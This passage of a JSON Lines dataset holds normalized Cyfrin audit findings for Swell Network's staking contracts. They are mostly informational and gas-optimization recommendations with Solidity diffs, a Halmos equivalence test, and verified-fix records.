{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-014", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 14, "page_start": null, "title": "Emit `ETHSent` event when sending eth", "short_summary": null, "description_md": null, "full_markdown": "### Emit `ETHSent` event when sending eth\n\n**Description:** `DepositManager::receive` emits an `ETHReceived` event when receiving eth, but `transferETHForWithdrawRequests` does not emit any events when sending eth; consider also emitting an `ETHSent` event when sending eth.\n\n**Swell:** Fixed in commit [c82dd3c](https://github.com/SwellNetwork/v3-contracts-lst/commit/c82dd3c8ca6853816dd9f1982ab0a5ef50d78cf2).\n\n**Cyfrin:**\nVerified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-015", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 15, "page_start": null, "title": "Use Checks-Effects-Interactions pattern in `swEXIT::createWithdrawRequest`", "short_summary": null, "description_md": null, "full_markdown": "### Use Checks-Effects-Interactions pattern in `swEXIT::createWithdrawRequest`\n\n**Description:** The current implementation uses [`_safeMint`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L209) before modifying state variables:\n* `withdrawalRequests[tokenId] `\n* `exitingETH`\n* `_lastTokenIdCreated`\n\nThis allows possible re-entrancy where the receiver and access the non-updated state variables. While during the audit no meaningful permissionless attack vectors related to this issue were found, to follow best security practices it is advisable to move `_safeMint` to the end of the function:\n\n```diff\n  function createWithdrawRequest(\n    uint256 amount\n  ) external override checkWhitelist(msg.sender) {\n    if (AccessControlManager.withdrawalsPaused()) {\n      revert WithdrawalsPaused();\n    }\n\n    if (amount < withdrawRequestMinimum) {\n      revert WithdrawRequestTooSmall(amount, withdrawRequestMinimum);\n    }\n\n    if (amount > withdrawRequestMaximum) {\n      revert WithdrawRequestTooLarge(amount, withdrawRequestMaximum);\n    }\n\n    IswETH swETH = AccessControlManager.swETH();\n    swETH.transferFrom(msg.sender, address(this), amount);\n\n    // Burn the tokens first to prevent reentrancy and to validate they own the requested amount of swETH\n    swETH.burn(amount);\n\n-   uint256 tokenId = _lastTokenIdCreated + 1; // Start off at 1\n+   uint256 tokenId = ++_lastTokenIdCreated; // Starts off at 1\n\n-   _safeMint(msg.sender, tokenId);\n\n    uint256 lastTokenIdProcessed = getLastTokenIdProcessed();\n\n    uint256 rateWhenCreated = AccessControlManager.swETH().swETHToETHRate();\n\n    withdrawalRequests[tokenId] = WithdrawRequest({\n      amount: amount,\n      timestamp: block.timestamp,\n      lastTokenIdProcessed: lastTokenIdProcessed,\n      rateWhenCreated: rateWhenCreated\n    });\n\n    exitingETH += wrap(amount).mul(wrap(rateWhenCreated)).unwrap();\n-   _lastTokenIdCreated = tokenId;\n+   _safeMint(msg.sender, tokenId);\n\n    emit WithdrawRequestCreated(\n      tokenId,\n      amount,\n      block.timestamp,\n      lastTokenIdProcessed,\n      rateWhenCreated,\n      msg.sender\n    );\n\n  }\n```\n\n**Swell:** Fixed in commits [d13aa43](https://github.com/SwellNetwork/v3-contracts-lst/commit/d13aa4390bb75c4e491b9cd92b7f7561cbe4ec15), [3f85df3](https://github.com/SwellNetwork/v3-contracts-lst/commit/3f85df3ba0e91b26e4234b15ad94f492fa6d46ec).\n\n**Cyfrin:**\nVerified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-016", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 16, "page_start": null, "title": "Missing events in `NodeOperatorRegistry` update methods", "short_summary": null, "description_md": null, "full_markdown": "### Missing events in `NodeOperatorRegistry` update methods\n\n**Description:** The following functions in `NodeOperatorRegistry` update multiple storage locations but don't emit any events:\n* `updateOperatorControllingAddress`\n* `updateOperatorRewardAddress`\n* `updateOperatorName`\n\nConsider emitting events in these functions to reflect the updates made to storage.\n\n**Swell:** Fixed in commit [5849640](https://github.com/SwellNetwork/v3-contracts-lst/commit/584964072b1543128c02e3287fe7746a8a094226).\n\n**Cyfrin:**\nVerified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-017", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 17, "page_start": null, "title": "Refactor identical code in `NodeOperatorRegistry::getNextValidatorDetails`", "short_summary": null, "description_md": null, "full_markdown": "### Refactor identical code in `NodeOperatorRegistry::getNextValidatorDetails`\n\n**Description:** The bodies of these two `else if` [branches](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/NodeOperatorRegistry.sol#L151-L162) are identical:\n\n```solidity\n} else if (foundOperatorId == 0) {\n  // If no operator has been found yet set the smallest operator active keys to the current operator\n  smallestOperatorActiveKeys = operatorActiveKeys;\n\n  foundOperatorId = operatorId;\n\n  // If the current operator has less keys than the smallest operator active keys, then we want to use this operator\n} else if (smallestOperatorActiveKeys > operatorActiveKeys) {\n  smallestOperatorActiveKeys = operatorActiveKeys;\n\n  foundOperatorId = operatorId;\n}\n```\n\nHence the code can be simplified to:\n```solidity\n// If no operator has been found yet set the smallest operator active keys to the current operator\n// If the current operator has less keys than the smallest operator active keys, then we want to use this operator\n} else if (foundOperatorId == 0 ||\n           smallestOperatorActiveKeys > operatorActiveKeys) {\n  smallestOperatorActiveKeys = operatorActiveKeys;\n  foundOperatorId = operatorId;\n}\n```\n\n**Swell:** Fixed in commit [d457d8d](https://github.com/SwellNetwork/v3-contracts-lst/commit/d457d8d109770f86b2b6ab3f785e1678ca341d6f).\n\n**Cyfrin:**\nVerified.\n\n\\clearpage\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-018", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 18, "page_start": null, "title": "Cache storage variables in memory when read multiple times without being changed", "short_summary": null, "description_md": null, "full_markdown": "### Cache storage variables in memory when read multiple times without being changed\n\n**Description:** As reading from storage is considerably more expensive than reading from memory, cache storage variables in memory when read multiple times without being changed:\n\nFile: `NodeOperatorRegistry.sol`\n```solidity\n// @audit cache `numOperators` in memory from storage\n// to prevent reading same value multiple times\n113:    uint128[] memory operatorAssignedDetails = new uint128[](numOperators + 1);\n125:     for (uint128 operatorId = 1; operatorId <= numOperators; operatorId++) {\n\n// @audit save incremented value in memory\n// to prevent reading same value multiple times, eg:\n// uint128 newNumOperators = ++numOperators;\n305:    numOperators += 1;\n// then use `newNumOperators` in L314,315\n314:    getOperatorIdForAddress[_operatorAddress] = numOperators;\n315:    getOperatorForOperatorId[numOperators] = operator;\n// @audit `Operator` struct can also be initialized this way:\n// getOperatorForOperatorId[numOperators] = Operator(true, _rewardAddress, _operatorAddress, _name, 0);\n\n// @audit cache `getOperatorForOperatorId[operatorId].activeValidators`\n660:    if (getOperatorForOperatorId[operatorId].activeValidators == 0) {\n666:      getOperatorForOperatorId[operatorId].activeValidators - 1\n```\n\nFile: `RepricingOracle.sol`\n```solidity\n// @audit cache rate when checked after repricing and use\n// cached version when processing withdrawals since the rate\n// only changes during repricing which has already occurred\n125:    if (swETHToETHRate > AccessControlManager.swETH().swETHToETHRate()) {\n132:        AccessControlManager.swETH().swETHToETHRate() // The rate to use for processing withdrawals\n\n// @audit cache `upgradeableRepriceSnapshot.meta.blockNumber` in memory from storage\n// to prevent reading same value multiple times\n290:    bool useOldSnapshot = upgradeableRepriceSnapshot.meta.blockNumber == 0;\n294:      : upgradeableRepriceSnapshot.meta.blockNumber;\n\n// @audit cache `maximumRepriceBlockAtSnapshotStaleness` in memory from storage\n// to prevent reading same value multiple times\n317:    if (snapshotStalenessInBlocks > maximumRepriceBlockAtSnapshotStaleness) {\n320:        maximumRepriceBlockAtSnapshotStaleness\n```\n\nFile: `swETH.sol`\n```solidity\n// @audit cache `lastRepriceUNIX` in memory from storage\n// to prevent reading same value multiple times\n222:    uint256 timeSinceLastReprice = block.timestamp - lastRepriceUNIX;\n249:    if (lastRepriceUNIX != 0) {\n\n// @audit cache `minimumRepriceTime` in memory from storage\n// to prevent reading same value multiple times\n224:    if (timeSinceLastReprice < minimumRepriceTime) {\n226:        minimumRepriceTime - timeSinceLastReprice\n\n// @audit cache `nodeOperatorRewardPercentage` in memory from storage\n// to prevent reading same value multiple times\n233:      nodeOperatorRewardPercentage;\n281:      UD60x18 nodeOperatorRewardPortion = wrap(nodeOperatorRewardPercentage)\n\n// @audit cache `swETHToETHRateFixed` in memory from storage\n// to prevent reading same value multiple times\n253:        swETHToETHRateFixed\n256:      uint256 maximumRepriceDiff = wrap(swETHToETHRateFixed)\n\n// @audit no need to re-read storage values, use the in-memory variables\n// that storage locations were just updated from to eliminate redundant but\n// expensive storage reads\n337:    lastRepriceETHReserves = totalReserves;\n338:    lastRepriceUNIX = block.timestamp;\n339:    swETHToETHRateFixed = updatedSwETHToETHRateFixed;\n\n341:   emit Reprice(\n342:      lastRepriceETHReserves, // @audit use `totalReserves` instead\n343:       swETHToETHRateFixed,   // @audit use `updatedSwETHToETHRateFixed` instead\n344:       nodeOperatorRewards,\n345:       swellTreasuryRewards,\n346:       totalETHDeposited\n\n// @audit the first check will fail most of the time during regular usage so\n// `swETHToETHRateFixed` will be read twice from storage with the same value\n374:    if (swETHToETHRateFixed == 0) {\n375:    return wrap(swETHToETHRateFixed);\n```\n\nFile: `swEXIT.sol`\n```solidity\n// @audit consider caching `withdrawRequestMinimum` and `withdrawRequestMaximum`\n// in memory to avoid an extra storage read in the revert case\n193:    if (amount < withdrawRequestMinimum) {\n194:       revert WithdrawRequestTooSmall(amount, withdrawRequestMinimum);\n195:     }\n\n197:     if (amount > withdrawRequestMaximum) {\n198:      revert WithdrawRequestTooLarge(amount, withdrawRequestMaximum);\n199:     }\n```\n\n**Swell:** Fixed in commits [23be897](https://github.com/SwellNetwork/v3-contracts-lst/commit/23be89740b7659ab4d98435d6a924364635fb9ca), [3f85df3](https://github.com/SwellNetwork/v3-contracts-lst/commit/3f85df3ba0e91b26e4234b15ad94f492fa6d46ec).\n\n**Cyfrin:**\nVerified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-019", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 19, "page_start": null, "title": "Cache array length outside of loops and consider unchecked loop incrementing", "short_summary": null, "description_md": null, "full_markdown": "### Cache array length outside of loops and consider unchecked loop incrementing\n\n**Description:** Cache array length outside of loops and consider using `unchecked {++i;}` if not compiling with `solc --ir-optimized --optimize`:\n\nFile: `DepositManager.sol`\n```solidity\n// @audit cache `validatorDetails.length`\n116:    for (uint256 i; i < validatorDetails.length; i++) {\n```\n\nFile: `NodeOperatorRegistry.sol`\n```solidity\n// @audit cache `numOperators`\n133:    uint128[] memory operatorAssignedDetails = new uint128[](numOperators + 1);\n125:      for (uint128 operatorId = 1; operatorId <= numOperators; operatorId++) {\n\n// @audit cache `_pubKeys.length`\n189:    validatorDetails = new ValidatorDetails[](_pubKeys.length);\n191:    for (uint256 i; i < _pubKeys.length; i++) {\n227:    numPendingValidators -= _pubKeys.length;\n\n// @audit cache `_validatorDetails.length`\n243:    if (_validatorDetails.length == 0) {\n257:        _validatorDetails.length >\n263:    for (uint128 i; i < _validatorDetails.length; i++) {\n282:    numPendingValidators += _validatorDetails.length;\n\n// @audit cache `_pubKeys.length`\n396:    for (uint128 i; i < _pubKeys.length; i++) {\n412:     numPendingValidators -= _pubKeys.length;\n\n// @audit cache `_pubKeys.length`\n425:     for (uint256 i; i < _pubKeys.length; i++) {\n\n// @audit cache `operatorIdToValidatorDetails[operatorId].length()`\n628:     if (operatorIdToValidatorDetails[operatorId].length() == 0) {\n634:      operatorIdToValidatorDetails[operatorId].length() - 1\n```\n\nFile: `swEXIT.sol`\n```solidity\n// @audit cache `requestsToProcess + 1`\n143:    for (uint256 i = 1; i < requestsToProcess + 1; ) {\n```\n\nFile: `Whitelist.sol`\n```solidity\n// @audit cache `_addresses.length`\n 84:    for (uint256 i; i < _addresses.length; ) {\n102:    for (uint256 i; i < _addresses.length; ) {\n```\n\n**Swell:** Fixed in commits [3c67e88](https://github.com/SwellNetwork/v3-contracts-lst/commit/3c67e88dbea1bb4cdf0bfeda27b40e71e494ef2c), [3f85df3](https://github.com/SwellNetwork/v3-contracts-lst/commit/3f85df3ba0e91b26e4234b15ad94f492fa6d46ec).\n\n**Cyfrin:**\nVerified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-020", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 20, "page_start": null, "title": "`NodeOperatorRegistry::_parsePubKeyToString`: Use shift operations rather than division/multiplication when dividend/factor is a power of 2", "short_summary": null, "description_md": null, "full_markdown": "### `NodeOperatorRegistry::_parsePubKeyToString`: Use shift operations rather than division/multiplication when dividend/factor is a power of 2\n\n**Description:** While `DIV` and `MUL` opcodes cost 5 gas unit each, shift operations cost 3 gas units. Therefore, `NodeOperatorRegistry::_parsePubKeyToString` can take advantage of them to save gas:\n\n```diff\n+   uint256 private SYMBOL_LENGTH = 16 // Because _SYMBOLS.length = 16\n    function _parsePubKeyToString(\n        bytes memory pubKey\n    ) internal pure returns (string memory) {\n        // Create the bytes that will hold the converted string\n-      bytes memory buffer = new bytes(pubKey.length * 2);\n+       // make sure that pubKey.length * 2 <= 2^256\n+      bytes memory buffer = new bytes(pubKey.length << 1);\n\n        bytes16 symbols = _SYMBOLS;\n+       uint256 symbolLength = symbols.length;\n+       uint256 index;\n        for (uint256 i; i < pubKey.length; i++) {\n-           buffer[i * 2] = symbols[uint8(pubKey[i]) / symbols.length];\n-           buffer[i * 2 + 1] = symbols[uint8(pubKey[i]) % symbols.length];\n+           index = i << 1; // i * 2\n+           buffer[index] = symbols[uint8(pubKey[i]) >> 4]; // SYMBOL_LENGTH = 2^4\n+           buffer[index + 1] = symbols[uint8(pubKey[i]) % SYMBOL_LENGTH];\n        }\n\n        return string(abi.encodePacked(\"0x\", buffer));\n    }\n```\n\nA more optimized version of this function looks like:\n```solidity\nbytes16 private constant _SYMBOLS = \"0123456789abcdef\";\nuint256 private constant SYMBOL_LENGTH = 16; // Because _SYMBOLS.length = 16\n\nfunction _parsePubKeyToString(bytes memory pubKey) internal pure returns (string memory) {\n    // Create the bytes that will hold the converted string\n    // make sure that pubKey.length * 2 <= 2^256\n    uint256 pubKeyLength  = pubKey.length;\n    bytes memory buffer   = new bytes(pubKeyLength << 1);\n\n    uint256 index;\n    for (uint256 i; i < pubKeyLength;) {\n        index             = i << 1; // i * 2\n        buffer[index]     = _SYMBOLS[uint8(pubKey[i]) >> 4]; // SYMBOL_LENGTH = 2^4\n        buffer[index + 1] = _SYMBOLS[uint8(pubKey[i]) % SYMBOL_LENGTH];\n\n        unchecked {++i;}\n    }\n\n    return string(abi.encodePacked(\"0x\", buffer));\n}\n```\n\nThe following stand-alone test using Foundry & [Halmos](https://github.com/a16z/halmos/) verifies that the optimized version returns the same output as the original:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.23;\n\nimport \"forge-std/Test.sol\";\n\n// run from base project directory with:\n// halmos --function test --match-contract ParseTest\ncontract ParseTest is Test {\n\n    bytes16 private constant _SYMBOLS = \"0123456789abcdef\";\n    uint256 private constant SYMBOL_LENGTH = 16; // Because _SYMBOLS.length = 16\n\n    function _parseOriginal(bytes memory pubKey) internal pure returns (string memory) {\n        // Create the bytes that will hold the converted string\n        bytes memory buffer = new bytes(pubKey.length * 2);\n\n        bytes16 symbols = _SYMBOLS;\n\n        // This conversion relies on taking the uint8 value of each byte, the first character in the byte is the uint8 value divided by 16 and the second character is modulo of the 16 division\n        for (uint256 i; i < pubKey.length; i++) {\n            buffer[i * 2] = symbols[uint8(pubKey[i]) / symbols.length];\n            buffer[i * 2 + 1] = symbols[uint8(pubKey[i]) % symbols.length];\n        }\n\n        return string(abi.encodePacked(\"0x\", buffer));\n    }\n\n    function _parseOptimized(bytes memory pubKey) internal pure returns (string memory) {\n        // Create the bytes that will hold the converted string\n        // make sure that pubKey.length * 2 <= 2^256\n        uint256 pubKeyLength  = pubKey.length;\n        bytes memory buffer   = new bytes(pubKeyLength << 1);\n\n        uint256 index;\n        for (uint256 i; i < pubKeyLength;) {\n            index             = i << 1; // i * 2\n            buffer[index]     = _SYMBOLS[uint8(pubKey[i]) >> 4]; // SYMBOL_LENGTH = 2^4\n            buffer[index + 1] = _SYMBOLS[uint8(pubKey[i]) % SYMBOL_LENGTH];\n\n            unchecked {++i;}\n        }\n\n        return string(abi.encodePacked(\"0x\", buffer));\n    }\n\n    function test_HalmosParse(bytes memory pubKey) public {\n        string memory resultOriginal  = _parseOriginal(pubKey);\n        string memory resultOptimized = _parseOptimized(pubKey);\n\n        assertEq(resultOriginal, resultOptimized);\n\n    }\n}\n```\n\n**Swell:** Fixed in commits [7db1874](https://github.com/SwellNetwork/v3-contracts-lst/commit/7db187409c7161d981b32d639e8b925fafc431a8), [3f85df3](https://github.com/SwellNetwork/v3-contracts-lst/commit/3f85df3ba0e91b26e4234b15ad94f492fa6d46ec).\n\n**Cyfrin:**\nVerified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-021", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 21, "page_start": null, "title": "Use `totalReserves - rewardsInETH.unwrap()` rather than `_preRewardETHReserves - rewardsInETH.unwrap() + _newETHRewards` in `swETH::reprice`", "short_summary": null, "description_md": null, "full_markdown": "### Use `totalReserves - rewardsInETH.unwrap()` rather than `_preRewardETHReserves - rewardsInETH.unwrap() + _newETHRewards` in `swETH::reprice`\n\n**Description:** Both result in the same output but the first expression saves a `SUB` opcode. In addition the suggested modification results in simpler code which better reflects the intention of the invariant.\n\n```diff\n    // swETH::reprice\n    uint256 totalReserves = _preRewardETHReserves + _newETHRewards;\n\n    uint256 rewardPercentageTotal = swellTreasuryRewardPercentage +\n      nodeOperatorRewardPercentage;\n\n    UD60x18 rewardsInETH = wrap(_newETHRewards).mul(\n      wrap(rewardPercentageTotal)\n    );\n\n    UD60x18 rewardsInSwETH = wrap(_swETHTotalSupply).mul(rewardsInETH).div(\n-       wrap(_preRewardETHReserves - rewardsInETH.unwrap() + _newETHRewards)\n+       wrap(totalReserves - rewardsInETH.unwrap())\n    );\n```\n\n**Swell:** Fixed in commit [7db1874](https://github.com/SwellNetwork/v3-contracts-lst/commit/7db187409c7161d981b32d639e8b925fafc431a8).\n\n**Cyfrin:**\nVerified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-022", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 22, "page_start": null, "title": "Remove redundant pause checks", "short_summary": null, "description_md": null, "full_markdown": "### Remove redundant pause checks\n\n**Description:** 1) Remove redundant `botMethodsPaused` [check](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L208-L210) in `swETH::reprice` as:\n\n* this function is only called by [`RepricingOracle::handleReprice`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L233)\n* `RepricingOracle::handleReprice` can only be called by [`submitSnapshot`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L89-L94) and [`submitSnapshotV2`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L105-L112) which both already contain the `botMethodsPaused` check.\n\n2) Remove redundant `withdrawalsPaused` [check](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L117-L119) in `swEXIT::processWithdrawals` as this function is only supposed to be callable by `RepricingOracle` which already [contains](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L129) the check.\n\n**Swell:** Fixed in commits [1fca965](https://github.com/SwellNetwork/v3-contracts-lst/commit/1fca965019facc4dcc79c35bfc45c8a711043196), [3f85df3](https://github.com/SwellNetwork/v3-contracts-lst/commit/3f85df3ba0e91b26e4234b15ad94f492fa6d46ec).\n\n**Cyfrin:**\nVerified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", 